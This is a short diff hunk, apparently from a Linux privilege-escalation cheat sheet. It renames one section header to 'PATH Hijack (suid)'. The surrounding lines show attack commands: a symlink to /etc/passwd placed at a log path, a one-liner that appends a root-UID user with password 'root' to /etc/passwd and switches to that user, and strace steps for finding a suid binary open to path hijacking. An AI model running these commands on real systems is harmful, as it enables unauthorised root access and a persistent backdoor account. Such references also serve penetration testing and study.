@@ -1369,7 +1369,7 @@ ln -sf /etc/passwd /var/log/below/error_root.log
 +---------- Write: /etc/passwd ----------+
 echo "any:$(openssl passwd -1 root):0:0:root:/root:/bin/bash" >> /etc/passwd && echo 'The password is: root'; su any
 
-+---------- None Absolute Path (suid) ----------+
++---------- PATH Hijack (suid) ----------+
 strace -f -o file /usr/local/bin/suid-name
 cat file | grep -rine 'chmod '
 env -i bash --norc --noprofile
